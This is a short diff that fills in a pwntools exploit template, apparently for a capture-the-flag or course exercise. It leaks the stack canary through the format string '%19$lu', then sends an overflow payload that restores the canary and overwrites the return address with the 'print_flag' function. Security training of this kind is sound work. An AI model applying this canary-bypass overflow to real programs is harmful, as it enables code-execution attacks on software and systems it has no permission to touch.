@@ -8,7 +8,7 @@ r = process([exe.path])
 # gdb.attach(r)
 
 r.recvuntil(b"What's your name? ")
-r.sendline(b"xxx") #Add your code here
+r.sendline(b"%19$lu") #Add your code here
 
 val = r.recvuntil(b"What's your message? ")
 # log.info(val)
@@ -18,7 +18,12 @@ log.info(f"Canary: {canary:x}")
 win = exe.symbols['print_flag']
 # log.info(hex(win))
 
-payload = # Add your payload here
+val1 = b"A" * (64+8)
+val2 = p64(canary)
+val3 = b"B" * 8
+val4 = p64(win)
+
+payload = val1 + val2 + val3 + val4 # Add your payload here
 r.sendline(payload)
 
 r.recvline()
